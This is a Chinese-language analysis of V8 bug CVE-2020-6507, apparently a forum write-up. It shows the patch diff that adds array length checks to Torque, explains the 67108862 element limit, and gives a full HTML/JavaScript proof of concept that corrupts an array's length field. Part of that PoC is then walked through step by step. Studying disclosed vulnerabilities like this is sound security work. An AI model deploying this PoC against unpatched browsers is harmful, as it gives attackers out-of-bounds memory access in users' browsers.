
```diff
diff --git a/src/builtins/base.tq b/src/builtins/base.tq
index ec10601..4db796d 100644
--- a/src/builtins/base.tq
+++ b/src/builtins/base.tq
@@ -354,6 +354,8 @@
     constexpr uintptr generates 'String::kMaxLength';

 const kFixedArrayMaxLength:
     constexpr int31 generates 'FixedArray::kMaxLength';

+const kFixedDoubleArrayMaxLength:
+    constexpr int31 generates 'FixedDoubleArray::kMaxLength';

 const kObjectAlignmentMask: constexpr intptr
     generates 'kObjectAlignmentMask';

 const kMinAddedElementsCapacity:
diff --git a/src/codegen/code-stub-assembler.cc b/src/codegen/code-stub-assembler.cc
index 369a187..eb5fa76 100644
--- a/src/codegen/code-stub-assembler.cc
+++ b/src/codegen/code-stub-assembler.cc
@@ -205,7 +205,7 @@
                              SmiConstant(false_value));
 }

-TNode<Object> CodeStubAssembler::NoContextConstant() {
+TNode<Smi> CodeStubAssembler::NoContextConstant() {
   return SmiConstant(Context::kNoContext);
 }

diff --git a/src/codegen/code-stub-assembler.h b/src/codegen/code-stub-assembler.h
index 4f4c1d4..592af14 100644
--- a/src/codegen/code-stub-assembler.h
+++ b/src/codegen/code-stub-assembler.h
@@ -616,7 +616,7 @@
     return Word32BinaryNot(TaggedEqual(a, b));
   }

-  TNode<Object> NoContextConstant();
+  TNode<Smi> NoContextConstant();

 #define HEAP_CONSTANT_ACCESSOR(rootIndexName, rootAccessorName, name)  \
   TNode<std::remove_pointer<std::remove_reference<decltype(            \
diff --git a/src/objects/contexts.tq b/src/objects/contexts.tq
index ab0677a..1b0ae08 100644
--- a/src/objects/contexts.tq
+++ b/src/objects/contexts.tq
@@ -74,3 +74,9 @@

 extern operator '[]' macro LoadContextElement(Context, intptr): Object;
 extern operator '[]' macro LoadContextElement(Context, Smi): Object;

+// A dummy used instead of a context constant for runtime calls that don't need
+// a context.
+type NoContext extends Smi;
+extern macro NoContextConstant(): NoContext;
+const kNoContext: NoContext = NoContextConstant();
diff --git a/src/objects/fixed-array.tq b/src/objects/fixed-array.tq
index 519a5f8d..b15f9c5 100644
--- a/src/objects/fixed-array.tq
+++ b/src/objects/fixed-array.tq
@@ -141,8 +141,15 @@
           ConstantIterator(kDoubleHole)));
 }

+namespace runtime {
+extern runtime FatalProcessOutOfMemoryInvalidArrayLength(NoContext): never;
+}
+
 macro NewFixedArray<Iterator: type>(length: intptr, it: Iterator): FixedArray {
   if (length == 0) return kEmptyFixedArray;
+  if (length > kFixedArrayMaxLength) deferred {
+      runtime::FatalProcessOutOfMemoryInvalidArrayLength(kNoContext);
+    }
   return new
   FixedArray{map: kFixedArrayMap, length: Convert<Smi>(length), objects: ...it};
 }
@@ -150,6 +157,9 @@
 macro NewFixedDoubleArray<Iterator: type>(
     length: intptr, it: Iterator): FixedDoubleArray|EmptyFixedArray {
   if (length == 0) return kEmptyFixedArray;
+  if (length > kFixedDoubleArrayMaxLength) deferred {
+      runtime::FatalProcessOutOfMemoryInvalidArrayLength(kNoContext);
+    }
   return new FixedDoubleArray{
     map: kFixedDoubleArrayMap,
     length: Convert<Smi>(length),
diff --git a/src/torque/constants.h b/src/torque/constants.h
index b3a452b..616e7a2 100644
--- a/src/torque/constants.h
+++ b/src/torque/constants.h
@@ -24,6 +24,7 @@
 static const char* const VOID_TYPE_STRING = "void";
 static const char* const ARGUMENTS_TYPE_STRING = "Arguments";
 static const char* const CONTEXT_TYPE_STRING = "Context";
+static const char* const NO_CONTEXT_TYPE_STRING = "NoContext";
 static const char* const NATIVE_CONTEXT_TYPE_STRING = "NativeContext";
 static const char* const JS_FUNCTION_TYPE_STRING = "JSFunction";
 static const char* const MAP_TYPE_STRING = "Map";
diff --git a/src/torque/declaration-visitor.cc b/src/torque/declaration-visitor.cc
index 6ec1b74..99b7bdd 100644
--- a/src/torque/declaration-visitor.cc
+++ b/src/torque/declaration-visitor.cc
@@ -126,11 +126,12 @@
         "Missing parameters for runtime function, at least the context "
         "parameter is required.");
   }
-  if (!(signature.parameter_types.types[0] == TypeOracle::GetContextType())) {
+  if (!(signature.parameter_types.types[0] == TypeOracle::GetContextType() ||
+        signature.parameter_types.types[0] == TypeOracle::GetNoContextType())) {
     ReportError(
         "first parameter to runtime functions has to be the context and have "
-        "type Context, but found type ",
-        signature.parameter_types.types[0]);
+        "type Context or NoContext, but found type ",
+        *signature.parameter_types.types[0]);
   }
   if (!(signature.return_type->IsSubtypeOf(TypeOracle::GetObjectType()) ||
         signature.return_type == TypeOracle::GetVoidType() ||
diff --git a/src/torque/type-oracle.h b/src/torque/type-oracle.h
index c47d467c6..c6939ef 100644
--- a/src/torque/type-oracle.h
+++ b/src/torque/type-oracle.h
@@ -304,6 +304,10 @@
     return Get().GetBuiltinType(CONTEXT_TYPE_STRING);
   }

+  static const Type* GetNoContextType() {
+    return Get().GetBuiltinType(NO_CONTEXT_TYPE_STRING);
+  }
+
   static const Type* GetNativeContextType() {
     return Get().GetBuiltinType(NATIVE_CONTEXT_TYPE_STRING);
   }
```

![图片描述](https://bbs.kanxue.com/upload/attach/202610/1075564_NH7X8K64QEDTF8V.webp)

## 漏洞成因

CVE-2020-6507 成因之一就是`NewFixedDoubleArray`这个`macro`未对`DoubleArray`的`Length`上限进行检查，属于是把 C++ 更换成 Torque 后漏了一步检查，不排除有内鬼的可能性。

源码里搜一下可以发现`kFixedDoubleArrayMaxLength`的值为`67108862`，可见 V8 中浮点数数组的`length`上限应该在`67108862`。

`vi src/objects/fixed-array.h`

![图片描述](https://bbs.kanxue.com/upload/attach/202610/1075564_TQDX6RVUB6F73QJ.webp)

![图片描述](https://bbs.kanxue.com/upload/attach/202610/1075564_DS2SJ4DN2YMATHE.webp)

![图片描述](https://bbs.kanxue.com/upload/attach/202610/1075564_63DQDBG4A8X773F.webp)

在开了 Pointer Compression 后：

- `kTaggedSize = 4`
- `kHeaderSize = 2 * kTaggedSize = 8`
- `kDoubleSize = 8`
- `MB = 2²⁰ = 1048576`
- `kMaxSize = 128 * kTaggedSize * MB - kTaggedSize = 536870908`

因此：

`FixedDoubleArray: (536870908 − 8) / 8 = 536870900 / 8 = 67108862.5 → 67108862`

## POC

```html
<script>
array = Array(0x40000).fill(1.1);

args = Array(0x100 - 1).fill(array);

args.push(Array(0x40000 - 4).fill(2.2));

giant_array = Array.prototype.concat.apply([], args);

giant_array.splice(giant_array.length, 0, 3.3, 3.3, 3.3);

length_as_double =
  new Float64Array(new BigUint64Array([0x2424242400000000n]).buffer)[0];

function trigger(array) {
  var x = array.length;

  x -= 67108861;

  x = Math.max(x, 0);

  x *= 6;  // 原文是 x \*= 6;

  x -= 5;

  x = Math.max(x, 0);

  let corrupting_array = [0.1, 0.1];

  let corrupted_array = [0.1];

  corrupting_array[x] = length_as_double;

  return [corrupting_array, corrupted_array];
}

for (let i = 0; i < 30000; ++i) {
  trigger(giant_array);
}

corrupted_array = trigger(giant_array)[1];

alert('corrupted array length: ' + corrupted_array.length.toString(16));

corrupted_array[0x123456];
</script>
```

目的是改`array`的`length`。

Issues 上的 POC 应该是在第 15 行多打了个`\`。

`d8`里没有`alert()`，把第 31 行改成`print`或者`console.log`都行。

开头先是创建了一个`giant_array`→`DoubleArray`，在`0x40000`（262144）个元素中填满`1.1`。`args`中有 255 个元素，每个都指向同一个`array`。然后创建一个长度为 262140、元素全是`2.2`的数组，把它`push`到`args`的末尾。

```javascript
giant_array = Array.prototype.concat.apply([], args);
```

相当于把`args`的元素依次复制进`giant_array`。

这时`giant_array`的长度为：

`255 * 0x40000 + (0x40000 - 4) = 67108860`

最后用`splice`在`giant_array`后面加上 3 个`3.3`，此时`giant_array`的长度为`67108863`。

由于创建`giant_array`调用的是`NewFixedDoubleArray()`方法，并没有对`giant_array`的长度做限制，显然`giant_array`超出了`DoubleArray`的`67108862`上限。

```javascript
length_as_double =
  new Float64Array(new BigUint64Array([0x2424242400000000n]).buffer)[0];
```

把同一段 8 字节内存先按`BigUint64Array`写入一个 64 位无符号整数，再按`Float64Array`当成 Double 读出来。
